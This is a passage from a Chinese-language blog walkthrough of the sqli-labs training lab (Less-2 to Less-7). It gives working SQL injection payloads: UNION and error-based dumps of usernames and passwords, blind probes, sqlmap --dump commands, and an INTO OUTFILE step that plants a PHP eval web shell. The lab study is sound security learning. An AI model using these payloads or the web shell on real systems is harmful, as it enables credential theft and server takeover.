class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=&#x27;security&#x27;),3--+</span><br><span class="line">?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;referers&#x27; and table_schema=&#x27;security&#x27;),3--+</span><br><span class="line">?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;uagents&#x27; and table_schema=&#x27;security&#x27;),3--+</span><br><span class="line">?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,email_id) separator &#x27;&lt;br&gt;&#x27;) from emails),3--+</span><br><span class="line">?id=-1 union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,referer,ip_address) separator &#x27;&lt;br&gt;&#x27;) from referers),3--+</span><br><span class="line">?id=-1 union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,uagent,ip_address,username) separator &#x27;&lt;br&gt;&#x27;) from uagents),3--+</span><br><span class="line">?id=-1 union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,username,password) separator &#x27;&lt;br&gt;&#x27;) from users),3--+</span><br></pre></td></tr></table></figure></li></ol></li><li><p>各步骤查询结果均与 Less-1 相同，此处不作赘述。</p></li></ul><h4 id="SQLMap-工具注入-2">SQLMap 工具注入</h4><ul><li><p>要获取当前数据库中的所有数据，可直接输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-2/?id=1 --dump</span><br></pre></td></tr></table></figure><p>查询结果如下图所示，不得不说，工具注入太舒适了！</p><img src="https://bu.dusays.com/2022/08/11/62f4b77132724.webp" alt="" style="zoom:75%"></li></ul><h3 id="Less-3">Less-3</h3><div class="note default flat"><p>GET - Error based - Single quotes with twist - String</p></div><p>打开本题界面如图所示，除了网页中的大号 <kbd>logo</kbd> 有所变化，其余均与 Less-1 一致，依然是向变量 <kbd>id</kbd> 传递数值参数。</p><img src="https://bu.dusays.com/2022/08/11/62f4b77279ab8.webp" alt="" style="zoom:75%"><h4 id="手工注入-3">手工注入</h4><ul><li><p>首先简单地传入数据 <kbd>1</kbd>，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>网页正常回显，内容如图所示：</p><img src="https://bu.dusays.com/2022/08/11/62f4b772dc7f3.webp" alt="" style="zoom:75%"></li><li><p>判断是否为数字型注入，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure><p>查询结果如图所示，两种结果相同，因此并非数字型注入。</p><img src="https://bu.dusays.com/2022/08/11/62f4b77317d84.webp" alt="" style="zoom:75%"></li><li><p>那么就需要判断字符型注入，首先构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br><span class="line">?id=1&quot;</span><br></pre></td></tr></table></figure><p>结果如下图所示，其中单引号造成了错误，因此暂判断为单引号闭合字符。</p><img src="https://bu.dusays.com/2022/08/11/62f4b9ad10768.webp" alt="" style="zoom:75%"></li><li><p>然后判断单引号外是否为唯一闭合符号，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;--+</span><br></pre></td></tr></table></figure><p>结果如下图所示，查询错误，因此闭合符号后应该还存在括号。</p><img src="https://bu.dusays.com/2022/08/11/62f4b7746a263.webp" alt="" style="zoom:75%"></li><li><p>对括号的判断则构造如下 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)--+</span><br></pre></td></tr></table></figure><p>结果如下图所示，查询成功，因此闭合符号为单引号加一个小括号的形式。</p><img src="https://bu.dusays.com/2022/08/11/62f4b7748e6d9.webp" alt="" style="zoom:75%"></li><li><p>后续操作则与前述题目一致，依然不做赘述，此处提供最后对于 <kbd>emails</kbd> 与 <kbd>users</kbd> 两张表中数据的查询所用的 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,email_id) separator &#x27;&lt;br&gt;&#x27;) from emails),3--+</span><br><span class="line">?id=-1&#x27;) union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,username,password) separator &#x27;&lt;br&gt;&#x27;) from users),3--+</span><br></pre></td></tr></table></figure></li></ul><h4 id="SQLMap-工具注入-3">SQLMap 工具注入</h4><ul><li><p>依然使用以下命令获取当前数据库中的所有数据，查询结果与之前均一致，故不做赘述，后续题目将默认手工注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-3/?id=1 --dump</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-4">Less-4</h3><div class="note default flat"><p>GET - Error based - Double Quotes - String</p></div><p>打开界面如图所示，开启了一个较为亮眼的颜色，其余部分均与之前一致。</p><img src="https://bu.dusays.com/2022/08/11/62f4b7753d674.webp" alt="" style="zoom:75%"><ul><li><p>本题为字符型注入且闭合字符为双引号加括号 <kbd>(&#34; &#34;)</kbd>，判断过程不做赘述，关键部分 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;)--+</span><br></pre></td></tr></table></figure></li><li><p>剩余过程也与前述题目一致，因此不做赘述，此处提供最后对于 <kbd>emails</kbd> 与 <kbd>users</kbd> 两张表中数据的查询所用的 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,email_id) separator &#x27;&lt;br&gt;&#x27;) from emails),3--+</span><br><span class="line">?id=-1&quot;) union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,username,password) separator &#x27;&lt;br&gt;&#x27;) from users),3--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-5">Less-5</h3><div class="note default flat"><p>GET - Double Injection - Single Quotes - String</p></div><p>打开界面如图所示，依然仅有颜色变化。</p><img src="https://bu.dusays.com/2022/08/11/62f4b775aba54.webp" alt="" style="zoom:75%"><ul><li><p>测试简单数据时，会发现本题不再回显数据内容，只要查询成功，便返回字符串：<em>You are in……</em></p><img src="https://bu.dusays.com/2022/08/11/62f4b76e24073.webp" alt="" style="zoom:75%"></li><li><p>由上，将不再可以通过将所需内容回显至原本数据输出位置来获取数据，因此，要将所需数据显示出来，就必须从其他地方入手。而剩下的地方只有一个，那便是报错信息，因此，本题将使用<strong>报错注入</strong>。</p></li><li><p>报错注入其实就是通过一些函数的错误使用而输出错误信息，其中就包含了我们所需要的信息。可用于报错注入的函数非常多，这里列举常用的四个：<kbd>updatexml()</kbd>、<kbd>extractvalue()</kbd>、<kbd>floor()</kbd> 和 <kbd>exp()</kbd>。</p><ul><li><kbd>updatexml()</kbd><p>该函数是 <kbd>MySQL</kbd> 对 <kbd>XML</kbd> 文档数据进行查询和修改的 <kbd>xpath</kbd> 函数。函数共有三个参数，其中第一个参数为 <kbd>XML</kbd> 的内容，第二个参数为 <kbd>XPath</kbd> 格式的字符串，作为数据修改的路径，而第三个参数即为修改后的内容。在报错注入中所利用的就是第二个参数，由于其需要 <kbd>XPath</kbd> 格式的字符串，而如果传入其他格式的信息便会报错并输出错误内容。因此，只要将需要的信息以普通字符串形式整合入第二个参数，就会引发报错，同时在错误提示中显示出所需要的信息。在本题中可用该函数构造如下 <kbd>payload</kbd> 完成对于数据库名的查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;￥ &#x27;,database(),&#x27; ￥&#x27;),1)--+</span><br></pre></td></tr></table></figure><p>其中，<kbd>concat()</kbd> 函数用于组合非 <kbd>XPath</kbd> 字符串，而要使任意字符串变为非 <kbd>XPath</kbd> 字符串，最简单的方法就是在字符串前加上一个特殊符号，如 <kbd>~</kbd>、<kbd>=</kbd>、<kbd>$</kbd> 等。为保证特殊性，这里使用字符 <kbd>￥</kbd> 作为前缀，且前后包裹以突出所需信息。因此，与之前题目一样，只需将所需的信息传入 <kbd>concat()</kbd> 函数的第二个参数即可在浏览器中得到所需的信息。上述 <kbd>payload</kbd> 查询结果如下，<kbd>￥</kbd> 字符之间即为库名：</p><img src="https://bu.dusays.com/2022/08/11/62f4b76ddaf83.webp" alt="" style="zoom:75%"><p>此外，值得注意的是，报错信息中对于输出的字符串有长度限制，实测限制长度为 <kbd>32</kbd> 个字符，因此在较长字符串输出时应特别注意这一点。</p><div class="tip warning faa-horizontal animated-hover"><p>经过进一步验证，<kbd>￥</kbd> 作为中文中的一个正儿八经的全角符号，使用 <kbd>concat()</kbd> 等一类函数进行连接之后作为参数将导致信息显示为空，因此在此 <kbd>￥</kbd> 符号仅作为特殊示范，后续都将使用符号 <kbd>~</kbd>，特此警示，切勿猎奇！</p></div></li><li><kbd>extractvalue()</kbd><p>该函数用于获取指定 <kbd>XML</kbd> 文档片段文本，含有两个参数，第一个参数指定片段，第二个参数则是 <kbd>XPath</kbd> 格式字符串用于指定路径。因此，依旧可以利用传入非 <kbd>XPath</kbd> 格式字符串至第二个参数引发报错，从而通过错误信息中的错误字符串部分获取信息。与 <kbd>updatexml()</kbd> 的形式基本一致，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(&#x27;￥ &#x27;,database(),&#x27; ￥&#x27;))--+</span><br></pre></td></tr></table></figure><p>回显结果则与 <kbd>updatexml()</kbd> 函数的结果一致，字符串长度同样限制为 <kbd>32</kbd> 个字符。其余不做赘述。</p></li><li><kbd>floor()</kbd><p>该函数的作用为将参数向下取整，当然仅有这个函数是不够的，还需要配合 <kbd>rand()</kbd> 函数生成 <kbd>0 ~ 1</kbd> 随机数，和 <kbd>count(1)</kbd> 函数统计表中各组行数，以及 <kbd>group by</kbd> 语句对结果进行分组。该注入的大致原理为 <kbd>group by</kbd> 语句执行分组时会生成一张临时表，在读取内容与对临时表的写入时会得到由 <kbd>()</kbd> 函数与 <kbd>rand()</kbd> 函数组合生成的 <kbd>0、1</kbd> 随机整数序列，由于读取与写入值可能会不一样，则有机会造成临时表中的主键冲突因而报错。当然，<kbd>count(1)</kbd> 函数统计的各组行数并不为我们所用，因为该函数在此仅作为聚集函数配合 <kbd>group by</kbd> 语句使用。实践证明，<kbd>rand()</kbd> 中的参数为 <kbd>0</kbd> 时，在查询结果为三列及以上会报错，而参数为 <kbd>14</kbd> 时，则在查询结果为两列及以上会报错。构造的报错的 SQL 语句主体如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>该 SQL 语句的执行结果如下图所示：</p><img src="https://bu.dusays.com/2022/08/11/62f4b76dc0eaf.webp" alt="" style="zoom:75%"><p>其中，数字 <kbd>1</kbd> 为 <kbd>floor(rand(0)*2)</kbd> 引起报错时的值，而后续对信息的回显则基于对该数据的操作。使用 <kbd>concat()</kbd> 函数将有效信息与报错数据相连即可实现信息捆绑输出，构造 SQL 语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),database());</span><br></pre></td></tr></table></figure><p>该 SQL 语句的执行结果如下图所示：</p><img src="https://bu.dusays.com/2022/08/11/62f4b76edb144.webp" alt="" style="zoom:75%"><p>在数字 <kbd>1</kbd> 后多出的数据便是所需要的信息，值得注意的是，该处字符串长度限制为 <kbd>64</kbd> 个字符，因此使用该报错注入可以帮助获得更多的信息！接下来的问题便是如何将该语句插入至 <kbd>payload</kbd> 中：</p><ul><li><p>参照之前的方法，只需要将已有语句闭合然后利用 <kbd>union</kbd> 并查即可，首先构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select id,count(1),concat(floor(rand(0)*2),database()) x from users group by x--+</span><br></pre></td></tr></table></figure><p>由于 <kbd>union</kbd> 语句需要保证查询列数相同，因此对后续语句稍作了修改，值得注意的是，并不需要给 <kbd>id</kbd> 变量赋错误值，因为我们利用的是报错，而非查询结果！理论上上述 <kbd>payload</kbd> 已经足够完成任务了，但是实际操作却会报另外一种错误：</p><img src="https://bu.dusays.com/2022/08/11/62f4b76f693e3.webp" alt="" style="zoom:75%"><p>错误提示显示 <kbd>union</kbd> 操作符前后的排序规则不同，也就是说，两个查询结果集所使用的字符集不同。经过测试，<kbd>concat()</kbd> 函数连接成的字符串使用系统默认字符集 <kbd>utf8mb3</kbd>（在 <kbd>MySQL</kbd> 中等同于 <kbd>utf8</kbd>），而该数据库使用的字符集为 <kbd>gbk</kbd>，因此出现了 <kbd>union</kbd> 运算符前后查询结果集中的元素字符集不匹配的情况。解决这一问题只需将 <kbd>concat()</kbd> 函数的执行结果转换成与数据库相同字符集即可，这里使用 <kbd>convert()</kbd> 函数完成转换操作，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select id,count(1),convert(concat(floor(rand(0)*2),database()) using gbk) x from users group by x--+</span><br></pre></td></tr></table></figure><p>执行结果如下图所示，已成功获取当前数据库名称，因此注入成功。</p><img src="https://bu.dusays.com/2022/08/11/62f4b76f85cc8.webp" alt="" style="zoom:75%"><div class="tip warning faa-horizontal animated-hover"><p>经过进一步验证，执行字符集转换操作时，依然转换为 <kbd>utf8</kbd> 或 <kbd>utf8mb3</kbd> 后，语句将能正常执行，不再对字符集报错，而转换为其他字符集（如 <kbd>latin1</kbd>）则依然报错。此外，对于该场景下的报错仅出现于 <kbd>MySQL8.0</kbd> 及以后版本。由于没能在官方文档中找到对应新增报错的信息，因此详细说明在此留一个坑。</p></div></li><li><p>鉴于 <kbd>union</kbd> 的复杂表现，这里引入另外一种方法，使用 <kbd>and</kbd> 操作符进行连接，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select count(1) from users group by concat(floor(rand(0)*2),database()))--+</span><br></pre></td></tr></table></figure><p>值得注意的是，<kbd>and</kbd> 操作符后的查询语句应加上小括号以表示对对于查询结果整体的运算，否则执行将造成语法错误。此外，上述用法虽不影响注入，但并没有实现 <kbd>and</kbd> 运算符的正确使用，即前后参数表达式的值应为表示<strong>真</strong>或<strong>假</strong>的布尔变量，对应于数字 <kbd>1</kbd> 与 <kbd>0</kbd>。为规范使用，应借助派生表实现对结果集的指定，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(1) from users group by concat(floor(rand(0)*2),database()))x)--+</span><br></pre></td></tr></table></figure><p>其中，每个派生表应有自己的别名，因此最后的 <kbd>x</kbd> 不能删去，但是可以修改为任意其他别名。</p></li></ul></li><li><kbd>exp()</kbd><p>该函数是计算以 <kbd>e</kbd> 为底的指数函数，当指定数据大于 <kbd>709</kbd> 时就会因为数据太大而溢出并报错。由于函数执行成功会返回数字 <kbd>0</kbd>，则将该结果按位取反即可获得最大的数值，传入函数即可造成报错，进一步利用子查询即可在报错信息会包含函数执行结果。构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (exp(~(select * from (select database())x)))--+</span><br></pre></td></tr></table></figure><p>遗憾的是，在 <kbd>MySQL5.7</kbd> 及以后版本中修复了此漏洞，无法利用该函数报错来获取信息，因此这里不作示范。</p></li></ul></li><li><p>本题使用 <kbd>floor()</kbd> 函数完成报错注入，后续注入只需将前文的关键载荷移入该方案对应位置即可，不过，实测无法使用 <kbd>group_concat()</kbd> 函数，因此多行内容需要借助 <kbd>limit</kbd> 语句逐句输出，也就是说无法依次输出全部数据了。各步骤所构造的 <kbd>payload</kbd> 实例如下（举一例）：</p><ul><li><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),floor (rand(0)*2))x from users group by x)a)--+</span><br></pre></td></tr></table></figure></li><li><p>获取列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=&#x27;security&#x27; limit 0,1),floor (rand(0)*2))x from users group by x)a)--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select concat_ws(&#x27;  -  &#x27;,id,email_id) from emails limit 0,1),floor (rand(0)*2))x from users group by x)a)--+</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="Less-6">Less-6</h3><div class="note default flat"><p>GET - Double Injection - Double Quotes - String</p></div><p>终于来到了第六关，进度条走过十分之一！！！</p><img src="https://bu.dusays.com/2022/08/17/62fc5f686887e.webp" alt="" style="zoom:75%"><ul><li><p>本题与第五关类似，查询成功则返回一串固定字符：<em>You are in……</em> 而查询失败则返回报错信息，唯一不同之处在于数据的闭合方式。在上一关中我们省略了对闭合符号的判断，其实判断方法与前文均相同，<a href="#Less-5">Less-5</a> 中的数据为单引号闭合，而本题则为双引号闭合，这里使用最简单的转移符判断的方式作为示例，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\</span><br></pre></td></tr></table></figure><p>执行结果如下图，从结果可看出闭合符号为双引号。</p><img src="https://bu.dusays.com/2022/08/17/62fc5f6857d1e.webp" alt="" style="zoom:75%"></li><li><p>由于仅存在闭合符号的区别，因此注入方式与上一关基本相同，只需将单引号换为双引号即可。这里示范查询 <kbd>users</kbd> 表中 <kbd>emails</kbd> 字段中的第一行数据，本次以 <kbd>extractvalue()</kbd> 作为报错函数，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and extractvalue(1,concat(&#x27;~ &#x27;,(select concat_ws(&#x27;  -  &#x27;,id,email_id) from emails limit 0,1),&#x27; ~&#x27;))--+</span><br></pre></td></tr></table></figure><p>执行结果如下，可见数据量不大时使用 <kbd>extractvalue()</kbd> 等函数会方便许多！</p><img src="https://bu.dusays.com/2022/08/17/62fc5f6872b24.webp" alt="" style="zoom:75%"></li></ul><h3 id="Less-7">Less-7</h3><div class="note default flat"><p>GET - Dump into outfile - String</p></div><p>界面变化依然不大，但从副标题 <em>Dump into outfile</em> 可以看出，注入形式有了重大变化。</p><img src="https://bu.dusays.com/2022/08/17/62fc5f69be705.webp" alt="" style="zoom:75%"><ul><li><p>首先测试一下，发现除了正常查询只返回固定字符串以外，查询出错也只返回固定字符串，也就是说不仅不能通过正常查询获取信息，通过报错信息也不行。</p><img src="https://bu.dusays.com/2022/09/04/6314b86f73e2f.webp" alt="" style="zoom:75%"></li><li><p>那么判断一下闭合方式，由于不再显示详细报错信息，因此通过转义符号 <kbd>\</kbd> 进行判断的方法自然也就不可用了，只能一步一步慢慢验证。具体过程与前文一致，这里列出各步的 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;                     [出错]</span><br><span class="line">?id=1&quot;                     [正常]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;--+                  [出错]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)--+                 [出错]</span><br><span class="line">?id=1&#x27;))--+                [正常]</span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/08/17/62fc5ffaae9ab.webp" alt="" style="zoom:75%"><p>最终得出本题使用的闭合符号为 <kbd>&#39;))</kbd>。</p></li><li><p>现在无论正确还是错误都显示固定字符串，仅能判断查询是否出错，本题的主要考点就是数据导出，因此这里使用该原理将木马植入靶机中，再利用蚁剑连接，然后就梦回 <a href="https://h-t-m.top/posts/ddd5444f/">upload-labs</a>。其中数据导出就是将指定内容写入到指定文件，需要使用如下 SQL 语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select [查询数据] into outfile [文件路径]--+</span><br></pre></td></tr></table></figure></li><li><p>要完成数据导出首先需要验证服务器参数 <kbd>secure_file_priv</kbd> 的值，这个参数用于限制数据导入导出的操作，有三个值：<strong>空</strong>、<strong>NULL</strong>、<strong>指定目录</strong>，分别表示操作无限制、禁止操作和只能在指定目录导入导出。</p><ul><li><p>笔者使用的 <kbd>MySQL</kbd> 中该参数默认值为<strong>空</strong>，可使用如下 <kbd>payload</kbd> 检验：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and length(@@secure_file_priv)=0--+</span><br></pre></td></tr></table></figure><kbd>length()</kbd> 函数用于获取变量 <kbd>@@secure_file_priv</kbd> 的长度，显然空值的长度为零。由于笔者事先确认过所用环境中该变量值为空，因此回车之后显示查询成功的页面，但是...欲知后事如何，参照前文中的 [MariaDB 问题](#MariaDB 问题)。</li><li><p>由于涉及数据库管理系统的区别对待，并且 MariaDB 会在版本号中附带名称，而 MySQL 则不然。</p><img src="https://bu.dusays.com/2022/09/04/6314b8740e774.webp" alt="" style="zoom:75%"><p>因此可以简单在攻击者视角通过延时注入完成对所用数据库管理系统的判断。当然，只针对对于 MySQL 与 MariaDB，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and substr(version(),8,1)=&#x27;m&#x27;--+</span><br></pre></td></tr></table></figure><p>其中 <kbd>substr()</kbd> 函数用于逐个截取字符串中的字符，第一个参数为待截取字符串，而第二和第三个参数分别表示起点和截取长度，因此只需修改第二个参数即可实现逐个字符截取。较为快速的方法是直接逐个字符与字符 <kbd>m</kbd> 比较，在较短范围内通过是否出现字符 <kbd>m</kbd> 即可对数据库做出简单的判断，比如笔者版本中字符 <kbd>m</kbd> 就出现在第八个字符。值得注意的是两个数据库都对大小写不敏感，因此不必考究 MariaDB 在版本中名称大小写问题。</p><img src="https://bu.dusays.com/2022/09/04/6314b87496268.webp" alt="" style="zoom:75%"></li><li><p>使用 MariaDB 的完全可以跳过对空值的判断，直接判断 <kbd>NULL</kbd> 值即可，通过 <kbd>select</kbd> 语句查询出的全局变量值为 <kbd>NULL</kbd> 即等价于 MySQL 中的空值。值得注意的是，在正儿八经 MySQL 中的 <kbd>NULL</kbd> 可并<strong>不代表空</strong>，所以如果确定是 <kbd>NULL</kbd> 值就得配置环境才能完成后续操作了。由于涉及 <kbd>NULL</kbd> 值的比较，因此这里使用 <kbd>&#60;=&#62;</kbd> 运算符或者 <kbd>is</kbd> 运算符完成对 <kbd>NULL</kbd> 的检验，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and @@secure_file_priv&lt;=&gt;NULL--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and @@secure_file_priv is NULL--+</span><br></pre></td></tr></table></figure><p>如前文所述，笔者实际使用的是 MariaDB，因此原本的空值就会在此与 <kbd>NULL</kbd> 值相同。</p><img src="https://bu.dusays.com/2022/09/04/6314b87522a1f.webp" alt="" style="zoom:75%"></li><li><p>经过上述步骤仍未判断出值，那基本确定变量被指定了地址，而指定的地址也几乎不可能是我们可操纵的，因此可以不必继续查询变量值了，配置环境后再继续本题吧。</p><div class="tip bell"><p>不过作为攻击者来说，对指定地址值进行检验倒也不是不行，顺便练习练习布尔盲注，<psw>万一值被错误地赋为射程范围内的话就赚了</psw>。操作方法参照前文对数据库管理系统的判断，由于表示地址的字符串需要严格区分大小写，因此这里需添加一个 <kbd>ascii()</kbd> 函数，直接比较码值以区分大小写，使用如下 <kbd>payload</kbd>：</p><pre><code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and ascii(substr(@@secure_file_priv,1,1))&gt;78--+</span><br></pre></td></tr></table></figure> 其中比较符号使用了大于号，也可以使用小于号，因为这里并不知道字符可能的取值，而大（小）于号可以辅助判断取值范围，提高效率。 当然在此之前还得对值得长度做个判断，使用如下 &lt;kbd&gt;payload&lt;/kbd&gt;：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and length(@@secure_file_priv)&lt;10--+</span><br></pre></td></tr></table></figure></code></pre></div></li></ul></li><li><p>然后就需要获取网站的绝对路径，这决定了攻击者能否用 URL 指向木马文件。绝对路径对于靶机的所有人来说，<psw>正是在下</psw>，应该是本身就知道的，但是作为攻击者，如果不主动获取到路径，将无法进入下一步。至于为啥不能使用相对路径，因为相对路径是相对于 <kbd>MySQL</kbd> 当前文件资源所在目录的相对路径，除非数据库数据文件存于靶机目录下，否则无法通过 URL 访问。但是事实上绝对路径的获取并不容易，<psw>笔者也并未找到合适的方法，暂时基本就是凭经验猜测</psw>。一般情况下，<kbd>Linux</kbd> 下 <kbd>Web</kbd> 服务器的默认根文件夹为 <kbd>/var/www/html/</kbd>，笔者靶机所在服务器的情况也正是如此，<psw>因为没有动他</psw>。由于访问靶机的 URL 为 <kbd>localhost/sqli-labs/</kbd>，因此靶机的绝对路径为 <kbd>/var/www/html/sqli-labs/</kbd>，将木马文件置于该目录即可。</p></li><li><p>接下来便可以植入木马了，基于数据导出的原理，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union select &quot;&lt;?php @eval($_POST[&#x27;h-t-m&#x27;]);?&gt;&quot;,1,2 into outfile &quot;/var/www/html/sqli-labs/muma.php&quot;--+</span><br></pre></td></tr></table></figure><p>回车之后就可以在指定目录中创建指定文件同时写入指定内容，值得注意的是，若文件已经存在，则导出无法成功，即仅能将数据存储至原先未存在的文件中。完成之后便可以在靶机文件夹中找到木马文件 <kbd>muma.php</kbd>，后续使用蚁剑连接该文件即可。</p><img src="https://bu.dusays.com/2022/08/17/62fc5f763e26b.webp" alt="" style="zoom:75%"><p>该文件直接存储于靶机根目录，因此文件 URL 为 <kbd>[靶机地址]/muma.php</kbd>，比如在笔者的环境下木马文件的 URL 就是 <kbd>http&#58;//localhost/sqli-labs/muma.php</kbd>，由于蚁剑运行于局域网的另一个操作系统中，因此实操使用的 URL 替换为对应局域网地址。</p><img 